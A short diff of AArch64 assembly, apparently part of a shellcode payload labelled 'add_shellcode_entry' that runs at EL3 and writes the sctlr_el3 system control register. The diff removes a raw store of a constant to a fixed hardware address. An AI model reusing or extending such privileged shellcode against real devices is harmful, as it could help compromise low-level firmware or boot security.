@@ -35,12 +35,6 @@ add_shellcode_entry:
   cmp        x0, #0x20
   b.lt       add_shellcode_entry
 
-  orr        x2, xzr, #0x180000000
-  add        x2, x2, #0x50, lsl #12
-  mov        x1, #0x100000000
-  add        x1, x1, #0x625
-  str        x1, [x2, #0x400]
-
   mov        x0, #0x100d
   msr        sctlr_el3, x0
   dsb        sy
